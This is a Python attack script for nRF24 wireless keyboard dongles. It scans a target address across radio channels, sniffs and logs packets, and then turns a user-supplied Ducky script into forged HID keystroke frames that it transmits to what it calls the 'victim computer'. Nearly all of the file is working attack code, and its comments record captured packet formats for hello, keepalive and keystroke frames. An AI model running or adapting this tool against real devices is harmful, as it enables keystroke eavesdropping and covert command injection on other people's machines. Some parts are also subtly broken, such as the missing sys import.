# This script is used for:
# 1. Scan for the devices - find all the addresses
# 2. sniffing the packets and keystrokes
# 3. injecting packets to victims computer

# imports
from usb.core import find as finddev
import codecs, time, logging, usb
from lib import common
import duckyparser


# parsing the args expression
common.init_args(f'./nrf24-attack.py')
common.parser.add_argument('-a', '--address', type=str, help='Address to sniff, following as it changes channels', required=True)
common.parser.add_argument('-t', '--timeout', type=float, help='Channel timeout, in milliseconds', default=100)
common.parser.add_argument('-k', '--ack_timeout', type=int, help='ACK timeout in microseconds, accepts [250,4000], step 250', default=250)
common.parser.add_argument('-r', '--retries', type=int, help='Auto retry limit, accepts [0,15]', default=1, choices=range(0, 16), metavar='RETRIES')
common.parser.add_argument('-p', '--ping_payload', type=str, help='Ping payload, ex 0F:0F:0F:0F', default='0F:0F:0F:0F', metavar='PING_PAYLOAD')
common.parse_and_init()


# Parse the address
address = codecs.decode(common.args.address.replace(':', ''), 'hex').decode('latin1')[::-1][:5] # Decoding the address for the dongle

address_hex = [] # addres hex for the script sending
for x in common.args.address.split(":"):
	address_hex.append(int(x, 16))


if len(address) < 2:
  raise Exception('Invalid address: {0}'.format(common.args.address))

# Put the radio in sniffer mode
common.radio.enter_sniffer_mode(address)

# Convert channel timeout from milliseconds to seconds
timeout = float(common.args.timeout) / float(1000)

# Parse the ping payload
ping_payload = codecs.decode(common.args.ping_payload.replace(':', ''), 'hex').decode('ascii') #convert the ping payload to hex and the decode to ascii

# Format the ACK timeout and auto retry values
ack_timeout = int(common.args.ack_timeout / 250) - 1
ack_timeout = max(0, min(ack_timeout, 15))
retries = max(0, min(common.args.retries, 15))

# Sweep through the channels and decode ESB packets in pseudo-promiscuous mode
first_time = time.time()
last_ping = time.time()
channel_index = 0
channels_index  = []

#Start the sniffing mode and show all the results
print("    time                  ch   len      address         payload")
print("    ----                  --   ----    ---------        ---------")
while time.time() - first_time < 60:

  # Follow the target device if it changes channels
  if time.time() - last_ping > timeout:

    # First try pinging on the active channel
    if not common.radio.transmit_payload(ping_payload, ack_timeout, retries):

      # Ping failed on the active channel, so sweep through all available channels
      success = False
      for channel_index in range(len(common.channels)):
        common.radio.set_channel(common.channels[channel_index])
        if common.radio.transmit_payload(ping_payload, ack_timeout, retries):

          # Ping successful, exit out of the ping sweep
          last_ping = time.time()
          if channel_index not in channels_index: 
          	channels_index.append(common.channels[channel_index])
          success = True
          break

    # Ping sweep failed
    if not success: logging.warning('Unable to ping {0}'.format(common.args.address))

    # Ping succeeded on the active channel
    else:
      print ('Ping success on channel {0}'.format(common.channels[channel_index]))
      last_ping = time.time()
    
  # Receive payloads
  value = common.radio.receive_payload()
  if value[0] == 0:

    # Reset the channel timer
    last_ping = time.time()

    # Split the payload from the status byte
    payload = value[1:]

    # Log the packet
    logging.info('{0: >2}  {1: >2}  {2}  {3}'.format(
              common.channels[channel_index],
              len(payload),
              common.args.address,
              ':'.join('{:02X}'.format(b) for b in payload)))

#two diff tries to run the script generate
#       8 byte of encrypted data    4byte sequence id incremented  chksum
#                |			   |				|
##00:D3:{2E:5D:28:C6:D2:6D:31:9C}:{73:CB:F4:C8}:00:00:00:00:00:00:00:AE
##00:D3:{B5:8D:7F:E1:15:C0:54:31}:{CF:B9:BD:6E}:00:00:00:00:00:00:00:7E
#HELLO PACKET == 00:0F:05:01:27:D4:00:34:99:23
#KEEP ALIVE PACKET = 00:40:00:14:AC
#SPECIAL BUTTONS = (MUTE) PRESS => 00:C3:E2:00:00:00:00:00:00:5B RELEASE => 00:C3:00:00:00:00:00:00:00:3D
#########################################################################################################################
############################# Ducky script parsing#######################################################################
#payload_template = [0, 0xC1, 0, 0, 0, 0, 0, 0, 0, 0]
#keepalive = [0x00, 0x40, 0x01, 0x16, 0xA9]
#hello = [0x00, 0x4F, 0x00, 0x04, 0xB0, 0x10, 0x00, 0x00, 0x00, 0xED]

payload_template = [0, 0xD3, 0, 0, 0, 0, 0, 0, 0, 0, 0x73, 0xCB, 0xF4, 0, 0, 0, 0, 0, 0, 0, 0, 0]
keepalive = [0x00, 0x40, 0x00, 0x14, 0xAC]
hello = [0x00, 0x0F, 0x05, 0x01, 0x27, 0xD4, 0x00, 0x34, 0x99, 0x23] 
       

# Calculating the checksum for the packet and add it
def checksum(payload):
        cksum = 0xff
        for n in range(0, len(payload) - 1):
            cksum = (cksum - payload[n]) & 0xff # => convert to hex byte
        cksum = (cksum + 1) & 0xff
        payload[-1] = cksum
        return payload

# The key function for the packet
def key_fun(payload, key):
	payload[2] = key['mod']
	payload[3] = key['hid']
	return payload

# building the frame
def frame(key={'hid': 0, 'mod': 0}):
	return checksum(key_fun(payload_template[:], key))

ducky_script = input("enter the path to the ducky script: ")

# if the path is empty exit
if ducky_script == "": 
	print("You must supply a path to ducky script")
	print("Attacks are disabled.")
	sys.exit(0)
else: # if the path is correct parse the script
        f = open(ducky_script, 'r')
        try:
            parser = duckyparser.DuckyParser(f.read(),layout='us')
        except KeyError:
            print("Invalid layout specified")
            exit(-1)

        attack = parser.parse() # The attack HID packet parsing - return the parsed packets from the keymap
        
# Creating the whole hid packet with keeoalive and hello frames      
for i in range(0, len(attack)):
            key = attack[i] # Enter the line of the script

            if i == 0:
                key['frames'] = [[address_hex + hello[:]]] # If it is the first line create hello frame
            else:
                key['frames'] = [] # If not first create empty frame

            if i < len(attack) - 1:# While it is not the first and continue to next line
                next_key = attack[i + 1]
            else:
                next_key = None

            if key['hid'] or key['mod']:
                key['frames'].append([address_hex + frame(key)]) # Create the frame from the keymap and the layout
                key['frames'].append([address_hex + keepalive[:]]) # After each frame create keep alive frame to save the connection
                if not next_key or key['hid'] == next_key['hid'] or next_key['sleep']:
                    key['frames'].append([address_hex + frame()]) # If it is the end of the script create frame with address, payload template and chksum
            elif key['sleep']:
                count = int(key['sleep']) / 10 # Number of script to create with the DELAY value from the ducky script
                for i in range(0, int(count)):
                    key['frames'].append([address_hex + keepalive[:]]) # If the parse return sleep create keep alive frame

#################################################################################################
################################### Transmit the payload attack #################################
for channel_index in channels_index:
	common.radio.set_channel(channel_index) # Set the cannel to the channel of the catched frames
	time.sleep(2)
	print(f"set the channel to {channel_index}")
	for key in attack:
		if key['frames']:
	        	for frame in key['frames']:
	        		if (common.radio.transmit_payload(frame[0]) > 0): # Trasmit the frames to the victim computer
	        			time.sleep(0.1)
	        		else:
	        			print("cant transmit")
print("Finish the attck of the civtim, Goodbye")
#Reset the usb
dev = finddev(idVendor=0x1915, idProduct=0x0102)
dev.reset()	
time.sleep(2)
